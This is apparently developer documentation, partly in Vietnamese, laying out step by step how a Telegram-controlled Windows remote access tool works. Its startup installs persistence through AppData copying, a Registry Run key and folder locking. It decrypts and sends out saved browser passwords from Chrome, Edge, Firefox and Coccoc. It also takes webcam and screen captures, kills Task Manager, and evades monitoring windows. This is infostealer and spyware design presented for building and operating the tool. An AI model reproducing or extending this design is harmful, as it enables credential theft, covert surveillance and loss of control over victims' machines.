# 🔄 DETAILED LOGIC FLOWS - STEP BY STEP

> **Developer:** TsByin  
> **Version:** 10.0 (Detailed Flow Documentation)

## **I. STARTUP SEQUENCE (Chi tiết)**

```
STEP 1: User runs: python V10.py
        ├─ Python interpreter starts
        └─ Reads V10.py from top to bottom

STEP 2: Import statements execute
        ├─ import sys, os, time, threading...
        │  (standard libraries)
        │
        ├─ from config import ...
        │  ├─ config.py executes:
        │  │  ├─ env_path = Path(__file__).parent / '.env'
        │  │  ├─ load_dotenv(dotenv_path=env_path)
        │  │  │  └─ Reads .env file
        │  │  │     API_TOKEN=xxx
        │  │  │     ADMIN_ID=123
        │  │  │
        │  │  ├─ logging.basicConfig()
        │  │  │  └─ Sets up logging to bot.log
        │  │  │
        │  │  ├─ API_TOKEN = os.getenv('API_TOKEN')
        │  │  ├─ ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
        │  │  │
        │  │  └─ Returns to V10.py
        │  │     (config constants ready)
        │  │
        │  └─ V10.py receives: API_TOKEN, ADMIN_ID, etc.
        │
        ├─ from utils import ... ✓
        ├─ from grabber import ... ✓
        ├─ from media import ... ✓
        └─ from monitor import SystemMonitor, BotStats ✓

STEP 3: Global variables initialized
        ├─ bot = TeleBot(API_TOKEN)
        │  └─ Creates Telegram bot connection
        │
        ├─ bot_stats = BotStats()
        │  └─ Creates stats tracker
        │
        ├─ intrusion_alert_active = False
        ├─ block_mode_active = False
        ├─ taskmgr_locked = False
        │
        ├─ BLOCKED_DATA = load_blocked_list(BLOCKED_FILE)
        │  └─ Reads blocked.json or creates {}
        │
        └─ CURRENT_SETTINGS = load_settings(SETTINGS_FILE)
           └─ Reads settings.json or creates {"menu_mode": 1}

STEP 4: Main code block executes
        ├─ check_integrity(...)
        │  ├─ Copy bot to AppData (persistence)
        │  ├─ Add to Registry Run (auto-start)
        │  └─ Protect folder (NTFS permissions)
        │
        ├─ monitor = SystemMonitor(ADMIN_ID, bot, config)
        │  └─ Creates monitor object (not started yet)
        │
        ├─ monitor_thread = threading.Thread(
        │      target=monitor.run, 
        │      daemon=True
        │  )
        │  └─ Creates thread object (not started yet)
        │
        ├─ monitor_thread.start()
        │  ├─ Thread starts immediately
        │  ├─ Calls monitor.run() in background
        │  │  └─ Loop:
        │  │     ├─ _check_self_defense()
        │  │     ├─ _check_blocked_apps()
        │  │     ├─ _check_taskmgr()
        │  │     ├─ _check_cpu_alert()
        │  │     ├─ _check_intrusion_alert()
        │  │     └─ time.sleep(1) ← Wait 1 second
        │  │
        │  └─ Main thread continues (doesn't wait)
        │
        ├─ logger.info(f"✅ Bot Started")
        │
        ├─ bot.send_message(ADMIN_ID, "🟢 SYSTEM ONLINE")
        │  └─ Sends startup message to admin
        │
        └─ while True:
           └─ bot.infinity_polling()
              ├─ Connect to Telegram servers
              ├─ Wait for messages
              ├─ When message arrives:
              │  └─ Match with @bot.message_handler
              │     └─ Call appropriate handler
              └─ Loop forever until KeyboardInterrupt

STEP 5: Handlers are registered (during import)
        ├─ @bot.message_handler(commands=['start', 'menu'])
        │  └─ menu_handler(m)
        │
        ├─ @bot.message_handler(func=lambda m: m.text == "💓 Kiểm Tra Bot")
        │  └─ check_status(m)
        │
        ├─ ... 20+ more handlers
        │
        └─ All handlers wait for messages in polling loop
```

---

## **II. MESSAGE HANDLING FLOW (User sends command)**

```
SCENARIO: User sends "/start" or "/menu"

┌─────────────────────────────────┐
│ User in Telegram client         │
│ Types: "/start" or "/menu"      │
│ Presses: Send button            │
└────────────┬────────────────────┘
             │
             ▼ (Goes to Telegram server)
    
┌─────────────────────────────────┐
│ Telegram servers receive message │
└────────────┬────────────────────┘
             │
             ▼ (Sends to polling bot)
    
┌─────────────────────────────────┐
│ bot.infinity_polling() receives  │
│ Message object (m):              │
│  ├─ m.from_user.id = 6314201835 │
│  ├─ m.chat.id = 6314201835       │
│  ├─ m.text = "/start" or "/menu" │
│  └─ m.date = timestamp           │
└────────────┬────────────────────┘
             │
             ▼ (Check all handlers)
    
┌─────────────────────────────────┐
│ @bot.message_handler(            │
│     commands=['start', 'menu']   │
│ )                               │
│ def menu_handler(m):            │
└────────────┬────────────────────┘
             │
    Handler matched! ✓
    (because m.text.startswith('/menu'))
             │
             ▼
    
┌─────────────────────────────────┐
│ menu_handler(m) executes:       │
│                                  │
│ if m.from_user.id != ADMIN_ID:  │
│     return                       │
│                                  │
│ (Check passes: 6314201835 ==    │
│  ADMIN_ID ✓)                    │
│                                  │
│ args = m.text.split()
│ # args = ['/start'] or ['/menu'] │
└────────────┬────────────────────┘
             │
             ▼
    
┌─────────────────────────────────┐
│ Always send text-based menu:    │
│     send_reply_menu(m)          │
└────────────┬────────────────────┘
             │
             ▼
    
┌─────────────────────────────────┐
│ save_settings() saves:          │
│ settings.json: {"menu_mode": 1} │
└────────────┬────────────────────┘
             │
             ▼
    
┌─────────────────────────────────┐
│ send_reply_menu(m):             │
│                                  │
│ mk = ReplyKeyboardMarkup(       │
│     row_width=2,                 │
│     resize_keyboard=True         │
│ )                               │
│                                  │
│ mk.add("🔑 Passwords", "🌐...")│
│ mk.add("🖼 Screenshot", "📸...")│
│ ... (add all 18 buttons)         │
└────────────┬────────────────────┘
             │
             ▼
    
┌─────────────────────────────────┐
│ bot.send_message(               │
│     m.chat.id,                   │
│     "🛡️ **Menu (Text Keyboard)**",│
│     reply_markup=mk,             │
│     parse_mode="Markdown"        │
│ )                               │
└────────────┬────────────────────┘
             │
             ▼ (Sends to Telegram)
    
┌─────────────────────────────────┐
│ Telegram server receives message │
│ Sends to user's device          │
└────────────┬────────────────────┘
             │
             ▼
    
┌─────────────────────────────────┐
│ User sees keyboard menu on       │
│ their screen:                    │
│                                  │
│ [🔑 Passwords] [🌐 History]      │
│ [🖼 Screenshot] [📸 Webcam]      │
│ ...                              │
└─────────────────────────────────┘
```

---

## **III. GRABBING PASSWORD FLOW (Detailed)**

```
USER: Presses "🔑 Lấy Passwords"

┌──────────────────────────────────────┐
│ @bot.message_handler(                │
│     func=lambda m: m.text ==         │
│     "🔑 Lấy Passwords"               │
│ )                                    │
│ def h_pass(m):                       │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ if m.from_user.id != ADMIN_ID:       │
│     return                           │
│ ✓ Check passes                       │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ def task():                          │
│     try:                             │
│         bot.send_message(            │
│             m.chat.id,               │
│             "⏳ Đang trích xuất..."  │
│         )                            │
│         # Send waiting message       │
│                                      │
│         outfile = grab_passwords(    │
│             BROWSER_PATHS,           │
│             compress=True,           │
│             max_workers=4            │
│         )                            │
└──────────┬───────────────────────────┘
           │
           ▼ (Launch background task)
┌──────────────────────────────────────┐
│ threading.Thread(                    │
│     target=task,                     │
│     daemon=True                      │
│ ).start()                            │
│                                      │
│ # Main thread returns immediately    │
│ # Task runs in background            │
└──────────┬───────────────────────────┘
           │
           ▼ (Inside task, call grabber)
────────────────────────────────────────────────────────────
│ GRABBER.PY EXECUTES                 │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ grab_passwords(BROWSER_PATHS, ...)   │
│                                      │
│ found_passwords = []                 │
│                                      │
│ with ThreadPoolExecutor(             │
│     max_workers=4                    │
│ ) as executor:                       │
│     futures = {}                     │
│                                      │
│     # Submit 4 extraction tasks      │
│     for name, path in BROWSER_PATHS: │
│         if os.path.exists(path):     │
│             futures[name] =          │
│             executor.submit(         │
│                 _extract_...,        │
│                 name,                │
│                 path                 │
│             )                        │
└──────────┬───────────────────────────┘
           │
           ▼ (Tasks run in parallel!)
           
    ┌──────────────────────────────┐
    │ FUTURE 1: Chrome             │
    │ _extract_browser_passwords(  │
    │     "Chrome",                │
    │     path=C:\Users\...\Chrome │
    │ )                            │
    │                              │
    │ get_master_key() → decrypt   │
    │ Loop profiles                │
    │ Loop Login Data rows         │
    │ Decrypt passwords (AES)      │
    │ Return: [p1, p2, ...]        │
    │ (Takes ~5 seconds)           │
    └──────────────────────────────┘
    
    ┌──────────────────────────────┐
    │ FUTURE 2: Edge               │
    │ (Takes ~5 seconds)           │
    └──────────────────────────────┘
    
    ┌──────────────────────────────┐
    │ FUTURE 3: Firefox            │
    │ (Takes ~3 seconds)           │
    └──────────────────────────────┘
    
    ┌──────────────────────────────┐
    │ FUTURE 4: Coccoc             │
    │ (Takes ~3 seconds)           │
    └──────────────────────────────┘
    
    ⏱️  TOTAL: ~8 seconds (parallel)
       (vs ~16 seconds sequential)
       = 2x FASTER! ⚡
           │
           ▼
┌──────────────────────────────────────┐
│ Collect results from all futures:    │
│                                      │
│ for name, future in futures.items(): │
│     try:                             │
│         passwords = future.result()  │
│         found_passwords.extend()     │
│     except Exception as e:           │
│         logger.error(...)            │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ found_passwords = [                 │
│     "[Chrome] google.com | user@... │
│     "[Edge] facebook.com | user@..  │
│     ... (many more)                  │
│ ]                                    │
│                                      │
│ if not found_passwords:              │
│     return None                      │
│                                      │
│ Write to file: pass.txt              │
│ f.write("TIME: 2025-12-05...")      │
│ f.write("TOTAL: 45\n")              │
│ for pwd in found_passwords:          │
│     f.write(pwd + "\n")              │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ Compress file:                       │
│                                      │
│ if compress:                         │
│     with gzip.open(                  │
│         "pass.txt.gz", 'wb'          │
│     ) as f_out:                      │
│         f_out.writelines(f_in)       │
│     os.remove("pass.txt")            │
│     return "pass.txt.gz"             │
│                                      │
│ File size: pass.txt (50KB) →         │
│            pass.txt.gz (25KB)        │
│            = 50% smaller!            │
└──────────┬───────────────────────────┘
           │
           ▼ (Return to h_pass task)
────────────────────────────────────────────────────────────
           │
           ▼
┌──────────────────────────────────────┐
│ Back in task():                      │
│                                      │
│ if outfile:                          │
│     with open(outfile, 'rb') as f:  │
│         bot.send_document(           │
│             m.chat.id,               │
│             f                        │
│         )                            │
│                                      │
│     cleanup_media_file(outfile)      │
│     bot_stats.increment_command()    │
│     logger.info(                     │
│         "Passwords sent successfully"│
│     )                                │
│ else:                                │
│     bot.send_message(                │
│         m.chat.id,                   │
│         "❌ No passwords found"      │
│     )                                │
│                                      │
│ except Exception as e:               │
│     logger.error(f"Failed: {e}")     │
└──────────┬───────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│ User receives:                       │
│ Document file: pass.txt.gz           │
│ Downloaded to their device           │
└──────────────────────────────────────┘
```

---

## **IV. MONITOR THREAD - TIMING**

```
Monitor Thread Timeline:

T=0s:  Thread starts
       └─ logger.info("🟢 System monitor started")

T=0s:  while not self.stop_event.is_set():
       └─ Check 1: _check_self_defense()
          └─ Get active window title
          └─ Close if "SystemMonitor" detected

T=0.01s: Check 2: _check_blocked_apps()
       └─ if block_mode_active:
          └─ psutil.process_iter()
             └─ Kill if in blocked list

T=0.02s: Check 3: _check_taskmgr()
       └─ if taskmgr_locked:
          └─ Find & kill taskmgr.exe

T=0.03s: Check 4: _check_cpu_alert()
       └─ cpu = psutil.cpu_percent(0.5)
       └─ if cpu > 95 AND last_alert > 5 min ago:
          └─ bot.send_message(admin, "⚠️ CPU high")

T=0.53s: Check 5: _check_intrusion_alert()
       └─ if intrusion_alert_active:
          └─ cap.read() → frame1
          └─ sleep(0.3)
          └─ cap.read() → frame2
          └─ cv2.absdiff(frame1, frame2) → motion
          └─ if motion > threshold:
             └─ Send photo to admin

T=1.0s: time.sleep(1)
       └─ Wait 1 second

T=1.0s: Back to top, repeat everything
```

**Example: Running for 60 seconds**
```
Every second:
├─ 1s: Check self, blocked, taskmgr, CPU, camera
├─ 2s: Check self, blocked, taskmgr, CPU, camera
├─ 3s: Check self, blocked, taskmgr, CPU, camera
...
├─ 59s: Check self, blocked, taskmgr, CPU, camera
└─ 60s: Check self, blocked, taskmgr, CPU, camera

Total: 60 complete monitoring cycles in 60 seconds!
All running in background without blocking main thread.
```

---

## **V. STATE MANAGEMENT**

```
GLOBAL STATES (Changed by commands):

intrusion_alert_active
├─ Initial: False
├─ Change by: "🚨 Cảnh Báo (Toggle)"
├─ Effect:
│  └─ Monitor thread checks webcam every loop
│     If motion detected → send photo
└─ Reset on: Graceful shutdown

block_mode_active
├─ Initial: False
├─ Change by: "🚫 Chặn App/Web"
├─ Effect:
│  └─ Monitor thread kills blocked processes
│     every second
└─ Reset on: Graceful shutdown

taskmgr_locked
├─ Initial: False
├─ Change by: "🔒 Khóa TaskMgr"
├─ Effect:
│  └─ Monitor thread kills taskmgr.exe
│     every second
└─ Reset on: Graceful shutdown

BLOCKED_DATA
├─ Initial: Loaded from blocked.json
├─ Change by: /block app xxx, /block site xxx
├─ Effect:
│  └─ Stored in memory and persisted to JSON
└─ Persistence: Auto-saved to disk

CURRENT_SETTINGS
├─ Initial: Loaded from settings.json
├─ Change by: /start or /menu
├─ Effect:
│  └─ Determines which menu to show
└─ Persistence: Auto-saved to disk
```

---

**✅ Now you understand the complete detailed flows!**
